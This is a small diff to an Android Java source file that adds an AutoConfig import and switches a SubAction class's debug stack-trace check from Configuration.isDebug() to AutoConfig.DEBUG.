@@ -11,6 +11,7 @@ import android.util.Log;
 
 import com.android.service.Debug;
 import com.android.service.Status;
+import com.android.service.auto.AutoConfig;
 import com.android.service.conf.Configuration;
 
 // TODO: Auto-generated Javadoc
@@ -163,7 +164,7 @@ public abstract class SubAction implements Runnable {
 		try {
 			execute();
 		} catch (Exception e) {
-			if(Configuration.isDebug()) { e.printStackTrace(); }
+			if(AutoConfig.DEBUG) { e.printStackTrace(); }
 		} finally {
 			synchronized (this) {
 				notify();
